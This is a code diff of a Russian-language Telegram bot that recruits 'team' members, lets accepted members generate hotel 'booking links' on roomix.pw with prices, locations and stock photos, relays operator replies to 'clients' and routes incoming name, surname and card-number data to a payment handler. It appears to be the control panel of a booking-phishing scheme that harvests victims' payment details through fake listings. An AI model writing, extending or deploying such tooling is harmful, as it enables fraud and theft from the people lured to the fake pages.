 # ★★★ ОБРАБОТКА КНОПКИ ОТВЕТА НА SMS ★★★
-
 @dp.callback_query(F.data.startswith("reply_sms:"))
 async def reply_sms_handler(callback: types.CallbackQuery, state: FSMContext):
     """Обработчик кнопки ответа на SMS"""
     user_id = callback.data.split(":")[1]
-    
-    # Сохраняем user_id для ответа
     await state.update_data(reply_user_id=user_id)
-    
+    reply_sessions[callback.message.chat.id] = user_id
+    creator = get_link_creator_info(user_id)
+    label = creator if creator else f"ID: {user_id}"
     await callback.message.answer(
-        f"💬 Ответ клиенту:\n"
-        f"ID: `{user_id}`\n\n"
-        "Введите ваш ответ:",
-        parse_mode="Markdown"
+        f"💬 Ответ клиенту:\nАдресат: {label}\n\nВведите ваш ответ:",
+        parse_mode="HTML"
     )
     await callback.answer()
 
 # ★★★ ОБРАБОТКА СООБЩЕНИЙ ОПЕРАТОРА ★★★
-
 @dp.message(F.chat.id.in_([ADMIN_CHAT_ID, SUPPORT_CHAT_ID, -1003473975732]))
 async def handle_operator_message(message: types.Message, state: FSMContext):
     """Обработка сообщений оператора"""
     try:
-        # Если это ответ через кнопку
         user_data = await state.get_data()
-        reply_user_id = user_data.get('reply_user_id')
-        
+        reply_user_id = user_data.get('reply_user_id') or reply_sessions.get(message.chat.id)
+
         if reply_user_id and message.text and not message.text.startswith('/'):
             operator_message = message.text
-            
-            # Отправляем сообщение клиенту
             server_url = "https://roomix-production.up.railway.app"
-            response = requests.post(
-                f"{server_url}/operator_reply",
-                json={
-                    'user_id': reply_user_id,
-                    'message': operator_message
-                },
-                timeout=10
-            )
-            
+            try:
+                response = requests.post(
+                    f"{server_url}/operator_reply",
+                    json={'user_id': reply_user_id, 'message': operator_message},
+                    timeout=15
+                )
+            except Exception as e:
+                logger.error(f"❌ Сетевая ошибка при отправке ответа: {e}")
+                await message.answer("❌ Сетевая ошибка отправки ответа")
+                return
+
             if response.status_code == 200:
+                creator = get_link_creator_info(reply_user_id)
+                label = creator if creator else f"ID: {reply_user_id}"
                 await message.answer(
-                    f"✅ Ответ отправлен клиенту!\n"
-                    f"ID: `{reply_user_id}`\n"
-                    f"Текст: {operator_message}",
-                    parse_mode="Markdown"
+                    f"✅ Ответ отправлен!\nАдресат: {label}\nТекст: {operator_message}",
+                    parse_mode="HTML"
                 )
                 await state.clear()
+                reply_sessions.pop(message.chat.id, None)
             else:
-                await message.answer("❌ Ошибка отправки ответа")
-                
-        # Если это платежные данные
+                body = None
+                try:
+                    body = response.text
+                except Exception:
+                    pass
+                logger.error(f"❌ Ошибка сервера operator_reply: {response.status_code} {body}")
+                await message.answer("❌ Ошибка сервера при отправке ответа")
+
         elif message.text and ("Имя:" in message.text or "Фамилия:" in message.text or "Номер:" in message.text):
             await process_payment_data(message)
-            
+
     except Exception as e:
         logger.error(f"❌ Ошибка обработки сообщения: {e}")
         await message.answer("❌ Ошибка обработки")
@@ -1337,10 +1139,8 @@ async def cmd_start(message: types.Message):
     if message.chat.id == ADMIN_CHAT_ID:
         await message.answer("👋 Админ панель готова к работе!")
         return
-        
     user_id = message.from_user.id
     user_status = get_user_status(user_id)
-
     if user_status == 'accepted':
         welcome_text = """
 🎉 <b>Добро пожаловать в команду!</b>
@@ -1371,12 +1171,10 @@ async def cmd_start(message: types.Message):
 """
         await message.answer(welcome_text, reply_markup=main_kb, parse_mode="HTML")
 
-
 @dp.message(F.text == "🏠 Главное меню")
 async def main_menu(message: types.Message):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     user_status = get_user_status(message.from_user.id)
     if user_status == 'accepted':
         welcome_text = """
@@ -1398,9 +1196,7 @@ async def main_menu(message: types.Message):
 async def start_application(message: types.Message, state: FSMContext):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     user_status = get_user_status(message.from_user.id)
-
     if user_status == 'accepted':
         await message.answer("✅ Вы уже приняты в команду!", reply_markup=accepted_kb)
         return
@@ -1410,7 +1206,6 @@ async def start_application(message: types.Message, state: FSMContext):
     elif user_status == 'pending':
         await message.answer("⏳ Ваша заявка уже на рассмотрении", reply_markup=main_kb)
         return
-
     await state.set_state(ApplicationStates.waiting_for_time)
     question_text = """
 ⏰ <b>Первый вопрос:</b>
@@ -1424,7 +1219,6 @@ async def start_application(message: types.Message, state: FSMContext):
 async def cancel_application(message: types.Message, state: FSMContext):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     await state.clear()
     await message.answer("❌ Заявка отменена", reply_markup=main_kb)
 
@@ -1432,21 +1226,16 @@ async def cancel_application(message: types.Message, state: FSMContext):
 async def process_time(message: types.Message, state: FSMContext):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     time_answer = message.text.strip()
-
     if not time_answer.isdigit():
         await message.answer("❌ Пожалуйста, введите число (например: 4, 6, 8)")
         return
-
     hours = int(time_answer)
     if hours > 24:
         await message.answer("❌ В сутках всего 24 часа! Введите реальное число")
         return
-
     await state.update_data(time=time_answer)
     await state.set_state(ApplicationStates.waiting_for_experience)
-
     question_text = """
 💼 <b>Второй вопрос:</b>
 
@@ -1459,16 +1248,12 @@ async def process_time(message: types.Message, state: FSMContext):
 async def process_experience(message: types.Message, state: FSMContext):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     experience = message.text.strip()
-
     if len(experience) < 5:
         await message.answer("❌ Пожалуйста, опишите опыт более подробно")
         return
-
     await state.update_data(experience=experience)
     await state.set_state(ApplicationStates.confirmation)
-
     user_data = await state.get_data()
     confirmation_text = f"""
 📋 <b>Проверьте вашу заявку:</b>
@@ -1484,11 +1269,8 @@ async def process_experience(message: types.Message, state: FSMContext):
 async def process_confirmation(message: types.Message, state: FSMContext):
     if message.chat.id == ADMIN_CHAT_ID:
         return
-        
     if message.text == "✅ Отправить заявку":
         user_data = await state.get_data()
-
-        # ИСПРАВЛЕННОЕ СОХРАНЕНИЕ ЗАЯВКИ
         application_id = save_application(
             user_id=message.from_user.id,
             username=message.from_user.username,
@@ -1496,12 +1278,10 @@ async def process_confirmation(message: types.Message, state: FSMContext):
             time=user_data['time'],
             experience=user_data['experience']
         )
-
         if application_id is None:
             await message.answer("❌ Ошибка сохранения заявки. Попробуйте позже.", reply_markup=main_kb)
             await state.clear()
             return
-
         application_text = f"""
 🚨 <b>НОВАЯ ЗАЯВКА #{application_id}</b>
 
@@ -1523,7 +1303,6 @@ Username: @{message.from_user.username or 'Нет'}
                 reply_markup=get_admin_buttons(application_id),
                 parse_mode="HTML"
             )
-
             success_text = """
 ✅ <b>Заявка отправлена!</b>
 
@@ -1532,11 +1311,9 @@ Username: @{message.from_user.username or 'Нет'}
 Ожидайте решения...
 """
             await message.answer(success_text, reply_markup=accepted_kb, parse_mode="HTML")
-        except Exception as e:
+        except Exception:
             await message.answer("❌ Произошла ошибка при отправки заявки. Попробуйте позже.", reply_markup=main_kb)
-
         await state.clear()
-
     elif message.text == "🔄 Заполнить заново":
         await state.clear()
         await start_application(message, state)
@@ -1547,11 +1324,8 @@ Username: @{message.from_user.username or 'Нет'}
 async def show_profile(callback: types.CallbackQuery):
     user_id = callback.from_user.id
     user_status = get_user_status(user_id)
-
     if user_status == 'accepted':
         join_date = get_join_date(user_id)
-        
-        # НОВЫЙ ПРОФИЛЬ КАК НА СКРИНШОТЕ
         profile_text = f"""
 <b>👤 Ваш профиль</b>
 
@@ -1572,11 +1346,7 @@ async def show_profile(callback: types.CallbackQuery):
 <b>Статус проекта:</b> WORK
 """
         await callback.message.delete()
-        await callback.message.answer(
-            profile_text,
-            reply_markup=profile_kb,
-            parse_mode="HTML"
-        )
+        await callback.message.answer(profile_text, reply_markup=profile_kb, parse_mode="HTML")
     else:
         await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
     await callback.answer()
@@ -1584,35 +1354,25 @@ async def show_profile(callback: types.CallbackQuery):
 @dp.callback_query(F.data.startswith("accept_"))
 async def accept_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
-
     conn = get_db_connection()
     if conn is None:
         await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
         return
-        
     cursor = conn.cursor()
     try:
         cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('accepted', application_id))
         conn.commit()
-
         cursor.execute('SELECT user_id, time, experience FROM applications WHERE id = %s', (application_id,))
         application = cursor.fetchone()
-        
         if application:
             user_id, time, experience = application
-
             user_message = """
 🎉 <b>Поздравляем! Ваша заявка принята!</b>
 
 Мы рады приветствовать вас в нашей команде!
 """
             try:
-                await bot.send_message(
-                    chat_id=int(user_id),
-                    text=user_message,
-                    parse_mode="HTML"
-                )
-
+                await bot.send_message(chat_id=int(user_id), text=user_message, parse_mode="HTML")
                 welcome_text = """
 🎉 <b>Добро пожаловать в команду!</b>
 
@@ -1627,10 +1387,8 @@ async def accept_application(callback: types.CallbackQuery):
                 )
             except Exception as e:
                 logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")
-
             await callback.message.edit_text(
-                f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\n"
-                f"Пользователь уведомлен о решении.",
+                f"✅ <b>ЗАЯВКА #{application_id} ПРИНЯТА</b>\n\nПользователь уведомлен о решении.",
                 parse_mode="HTML"
             )
     except Exception as e:
@@ -1638,29 +1396,23 @@ async def accept_application(callback: types.CallbackQuery):
         await callback.answer("❌ Ошибка принятия заявки", show_alert=True)
     finally:
         conn.close()
-
     await callback.answer()
 
 @dp.callback_query(F.data.startswith("reject_"))
 async def reject_application(callback: types.CallbackQuery):
     application_id = callback.data.split("_")[1]
-
     conn = get_db_connection()
     if conn is None:
         await callback.answer("❌ Ошибка подключения к БД", show_alert=True)
         return
-        
     cursor = conn.cursor()
     try:
         cursor.execute('UPDATE applications SET status = %s WHERE id = %s', ('rejected', application_id))
         conn.commit()
-
         cursor.execute('SELECT user_id FROM applications WHERE id = %s', (application_id,))
         application = cursor.fetchone()
-        
         if application:
             user_id = application[0]
-
             user_message = """
 😔 <b>К сожалению, ваша заявка отклонена.</b>
 
@@ -1669,18 +1421,11 @@ async def reject_application(callback: types.CallbackQuery):
 Желаем удачи в будущих проектах!
 """
             try:
-                await bot.send_message(
-                    chat_id=int(user_id),
-                    text=user_message,
-                    reply_markup=main_kb,
-                    parse_mode="HTML"
-                )
+                await bot.send_message(chat_id=int(user_id), text=user_message, reply_markup=main_kb, parse_mode="HTML")
             except Exception as e:
                 logger.error(f"❌ Ошибка отправки сообщения пользователю: {e}")
-
             await callback.message.edit_text(
-                f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\n"
-                f"Пользователь уведомлен о решении.",
+                f"❌ <b>ЗАЯВКА #{application_id} ОТКЛОНЕНА</b>\n\nПользователь уведомлен о решении.",
                 parse_mode="HTML"
             )
     except Exception as e:
@@ -1688,21 +1433,17 @@ async def reject_application(callback: types.CallbackQuery):
         await callback.answer("❌ Ошибка отклонения заявки", show_alert=True)
     finally:
         conn.close()
-
     await callback.answer()
 
 # ========== ОБРАБОТЧИКИ ДЛЯ СИСТЕМЫ ССЫЛОК ==========
 
-# Обработчик кнопки "Создать ссылку"
 @dp.callback_query(F.data == "create_link")
 async def create_link_start(callback: types.CallbackQuery, state: FSMContext):
     user_status = get_user_status(callback.from_user.id)
     if user_status != 'accepted':
         await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
         return
-    
     await state.set_state(LinkStates.waiting_for_name)
-    
     await callback.message.answer(
         "🔗 <b>Создание ссылки для бронирования</b>\n\n"
         "📝 <b>Шаг 1 из 5:</b> Введите название номера\n\n"
@@ -1714,16 +1455,13 @@ async def create_link_start(callback: types.CallbackQuery, state: FSMContext):
     )
     await callback.answer()
 
-# Обработчик кнопки "Мои ссылки"
 @dp.callback_query(F.data == "my_links")
 async def show_my_links(callback: types.CallbackQuery):
     user_status = get_user_status(callback.from_user.id)
     if user_status != 'accepted':
         await callback.answer("❌ У вас нет доступа к этой функции", show_alert=True)
         return
-    
     links = get_user_links(callback.from_user.id)
-    
     if not links:
         await callback.message.answer(
             "📋 <b>Мои ссылки</b>\n\n"
@@ -1742,7 +1480,6 @@ async def show_my_links(callback: types.CallbackQuery):
             links_text += f"   💰 {link['price']} PLN\n"
             links_text += f"   📍 {link['location']}\n"
             links_text += f"   🌐 <code>https://roomix.pw/{link['code']}</code>\n\n"
-        
         await callback.message.answer(
             links_text,
             parse_mode="HTML",
@@ -1753,24 +1490,19 @@ async def show_my_links(callback: types.CallbackQuery):
         )
     await callback.answer()
 
-# Обработчик кнопки "Назад" в профиль
 @dp.callback_query(F.data == "back_to_profile")
 async def back_to_profile(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
     await show_profile(callback)
 
-# Шаг 1: Название
 @dp.message(LinkStates.waiting_for_name)
 async def process_link_name(message: types.Message, state: FSMContext):
     name = message.text.strip()
-    
     if len(name) < 3:
         await message.answer("❌ Название должно быть не менее 3 символов. Попробуйте еще раз:")
         return
-    
     await state.update_data(link_name=name)
     await state.set_state(LinkStates.waiting_for_price)
-    
     await message.answer(
         "💰 <b>Шаг 2 из 5:</b> Введите цену за ночь (в PLN)\n\n"
         "<i>Пример:</i> <code>450</code>",
@@ -1780,23 +1512,18 @@ async def process_link_name(message: types.Message, state: FSMContext):
         ])
     )
 
-# Шаг 2: Цена
 @dp.message(LinkStates.waiting_for_price)
 async def process_link_price(message: types.Message, state: FSMContext):
     price_text = message.text.strip()
-    
     if not price_text.isdigit():
         await message.answer("❌ Цена должна быть числом. Попробуйте еще раз:")
         return
-    
     price = int(price_text)
     if price < 10 or price > 10000:
         await message.answer("❌ Цена должна быть от 10 до 10000 PLN. Попробуйте еще раз:")
         return
-    
     await state.update_data(price=price)
     await state.set_state(LinkStates.waiting_for_location)
-    
     await message.answer(
         "📍 <b>Шаг 3 из 5:</b> Введите страну и город\n\n"
         "<i>Пример:</i> <code>Польша, Варшава</code>",
@@ -1806,18 +1533,14 @@ async def process_link_price(message: types.Message, state: FSMContext):
         ])
     )
 
-# Шаг 3: Локация
 @dp.message(LinkStates.waiting_for_location)
 async def process_link_location(message: types.Message, state: FSMContext):
     location = message.text.strip()
-    
     if len(location) < 2:
         await message.answer("❌ Локация должна быть не менее 2 символов. Попробуйте еще раз:")
         return
-    
     await state.update_data(location=location)
     await state.set_state(LinkStates.waiting_for_photos)
-    
     await message.answer(
         "🖼️ <b>Шаг 4 из 5:</b> Пришлите фотографии номера\n\n"
         "📎 Можно отправить несколько фото сразу\n"
@@ -1833,45 +1556,27 @@ async def process_link_location(message: types.Message, state: FSMContext):
         ])
     )
 
-# Шаг 4: Фотографии (исправленная версия - кнопки показываем только один раз)
 @dp.message(LinkStates.waiting_for_photos, F.photo)
 async def process_link_photos(message: types.Message, state: FSMContext):
     try:
-        # Получаем самое качественное фото
         photo = message.photo[-1]
         file_id = photo.file_id
-        
-        # Получаем file_path для создания прямой ссылки
         file = await bot.get_file(file_id)
         file_path = file.file_path
-        
-        # Создаем прямую ссылку на фото
         photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-        
         user_data = await state.get_data()
         current_photos = user_data.get('photos', [])
-        
-        # Добавляем фото в список
         current_photos.append(photo_url)
-        
-        # Ограничиваем максимум 5 фото
         if len(current_photos) > 5:
             current_photos = current_photos[:5]
             await message.answer("⚠️ Загружено максимальное количество фото (5). Автоматически переходим к подтверждению...")
             await state.update_data(photos=current_photos)
             await process_photos_complete(message, state)
             return
-        
         await state.update_data(photos=current_photos)
-        
-        # Показываем просто счетчик без кнопок
         progress_text = f"📸 Фото {len(current_photos)}/5 сохранено"
-        
-        # Если это первое фото - показываем кнопки
         if len(current_photos) == 1:
-            progress_text += "\n\n✅ Минимальное количество фото загружено!\n"
-            progress_text += "Можете загрузить еще фото или нажать «✅ Готово»"
-            
+            progress_text += "\n\n✅ Минимальное количество фото загружено!\nМожете загрузить еще фото или нажать «✅ Готово»"
             await message.answer(
                 progress_text,
                 reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -1881,19 +1586,14 @@ async def process_link_photos(message: types.Message, state: FSMContext):
                 ])
             )
         else:
-            # Для последующих фото просто показываем счетчик
             await message.answer(progress_text)
-        
-        # Автоматический переход если достигли максимума
         if len(current_photos) >= 5:
             await message.answer("✅ Загружено максимальное количество фото (5). Переходим к подтверждению...")
             await process_photos_complete(message, state)
-            
     except Exception as e:
         logger.error(f"❌ Ошибка обработки фото: {e}")
         await message.answer("❌ Ошибка загрузки фото. Попробуйте еще раз.")
 
-# Обработчик для документов-изображений (исправленный)
 @dp.message(LinkStates.waiting_for_photos, F.document)
 async def process_link_documents(message: types.Message, state: FSMContext):
     if message.document.mime_type and message.document.mime_type.startswith('image/'):
@@ -1902,29 +1602,19 @@ async def process_link_documents(message: types.Message, state: FSMContext):
             file = await bot.get_file(file_id)
             file_path = file.file_path
             photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-            
             user_data = await state.get_data()
             current_photos = user_data.get('photos', [])
             current_photos.append(photo_url)
-            
-            # Ограничиваем максимум 5 фото
             if len(current_photos) > 5:
                 current_photos = current_photos[:5]
                 await message.answer("⚠️ Загружено максимальное количество фото (5). Автоматически переходим к подтверждению...")
                 await state.update_data(photos=current_photos)
                 await process_photos_complete(message, state)
                 return
-            
             await state.update_data(photos=current_photos)
-            
-            # Показываем просто счетчик без кнопок
             progress_text = f"📸 Фото {len(current_photos)}/5 сохранено"
-            
-            # Если это первое фото - показываем кнопки
             if len(current_photos) == 1:
-                progress_text += "\n\n✅ Минимальное количество фото загружено!\n"
-                progress_text += "Можете загрузить еще фото или нажать «✅ Готово»"
-                
+                progress_text += "\n\n✅ Минимальное количество фото загружено!\nМожете загрузить еще фото или нажать «✅ Готово»"
                 await message.answer(
                     progress_text,
                     reply_markup=InlineKeyboardMarkup(inline_keyboard=[
@@ -1934,59 +1624,43 @@ async def process_link_documents(message: types.Message, state: FSMContext):
                     ])
                 )
             else:
-                # Для последующих фото просто показываем счетчик
                 await message.answer(progress_text)
-            
-            # Автоматический переход если достигли максимума
             if len(current_photos) >= 5:
                 await message.answer("✅ Загружено максимальное количество фото (5). Переходим к подтверждению...")
                 await process_photos_complete(message, state)
-                
         except Exception as e:
             logger.error(f"❌ Ошибка обработки документа: {e}")
             await message.answer("❌ Ошибка загрузки файла.")
     else:
         await message.answer("❌ Пожалуйста, отправьте изображение (фото)")
 
-# Кнопка "Готово" - исправленная версия
 @dp.callback_query(F.data == "photos_done")
 async def photos_done_handler(callback: types.CallbackQuery, state: FSMContext):
     user_data = await state.get_data()
     photos = user_data.get('photos', [])
-    
     if not photos:
         await callback.answer("❌ Нужно хотя бы 1 фото", show_alert=True)
         return
-    
     await callback.message.delete()
     await process_photos_complete(callback.message, state)
     await callback.answer()
 
-# Кнопка "Пропустить" - используем стандартные фото
 @dp.callback_query(F.data == "skip_photos")
 async def skip_photos_handler(callback: types.CallbackQuery, state: FSMContext):
-    user_data = await state.get_data()
-    
-    # Используем стандартные фото если пользователь пропустил
     default_photos = [
         "https://images.unsplash.com/photo-1571896349842-33c89424de2d?auto=format&fit=crop&w=800&q=80",
         "https://images.unsplash.com/photo-1566073771259-6a8506099945?auto=format&fit=crop&w=800&q=80",
         "https://images.unsplash.com/photo-1582719478250-c89cae4dc85b?auto=format&fit=crop&w=800&q=80"
     ]
-    
     await state.update_data(photos=default_photos)
     await process_photos_complete(callback.message, state)
     await callback.answer()
 
-# Функция завершения загрузки фото
 async def process_photos_complete(message: types.Message, state: FSMContext):
     user_data = await state.get_data()
     photos = user_data.get('photos', [])
-    
     await state.update_data(images=photos)
     await state.set_state(LinkStates.confirmation)
-    
-    # Показываем подтверждение
     confirmation_text = (
         "📋 <b>Проверьте данные ссылки:</b>\n\n"
         f"🏷️ <b>Название:</b> {user_data['link_name']}\n"
@@ -1995,7 +1669,6 @@ async def process_photos_complete(message: types.Message, state: FSMContext):
         f"🖼️ <b>Фото:</b> {len(photos)} шт.\n\n"
         "Всё верно?"
     )
-    
     await message.answer(
         confirmation_text,
         parse_mode="HTML",
@@ -2008,7 +1681,6 @@ async def process_photos_complete(message: types.Message, state: FSMContext):
         ])
     )
 
-# Кнопки "Назад" между шагами
 @dp.callback_query(F.data == "back_to_name")
 async def back_to_name(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(LinkStates.waiting_for_name)
@@ -2052,12 +1724,9 @@ async def back_to_location(callback: types.CallbackQuery, state: FSMContext):
 @dp.callback_query(F.data == "back_to_photos")
 async def back_to_photos(callback: types.CallbackQuery, state: FSMContext):
     await state.set_state(LinkStates.waiting_for_photos)
-    
-    # СБРАСЫВАЕМ список фото при возврате
     user_data = await state.get_data()
     if 'photos' in user_data:
         await state.update_data(photos=[])
-    
     await callback.message.edit_text(
         "🖼️ <b>Шаг 4 из 5:</b> Пришлите фотографии номера\n\n"
         "📎 Можно отправить несколько фото сразу\n"
@@ -2074,15 +1743,10 @@ async def back_to_photos(callback: types.CallbackQuery, state: FSMContext):
     )
     await callback.answer()
 
-# Подтверждение и создание ссылки
 @dp.callback_query(F.data == "confirm_link")
 async def confirm_link_creation(callback: types.CallbackQuery, state: FSMContext):
     user_data = await state.get_data()
-    
-    # Генерируем уникальный код
     link_code = generate_link_code()
-    
-    # Сохраняем в БД
     success = save_booking_link(
         user_id=callback.from_user.id,
         link_name=user_data['link_name'],
@@ -2091,10 +1755,8 @@ async def confirm_link_creation(callback: types.CallbackQuery, state: FSMContext
         images=user_data['images'],
         link_code=link_code
     )
-    
     if success:
         full_url = f"https://roomix.pw/#{link_code}"
-        
         await callback.message.edit_text(
             "✅ <b>Ссылка успешно создана!</b>\n\n"
             f"🏷️ <b>Название:</b> {user_data['link_name']}\n"
@@ -2120,11 +1782,9 @@ async def confirm_link_creation(callback: types.CallbackQuery, state: FSMContext
                 [InlineKeyboardButton(text="◀️ В профиль", callback_data="back_to_profile")]
             ])
         )
-    
     await state.clear()
     await callback.answer()
 
-# Перезапуск создания ссылки
 @dp.callback_query(F.data == "restart_link")
 async def restart_link_creation(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
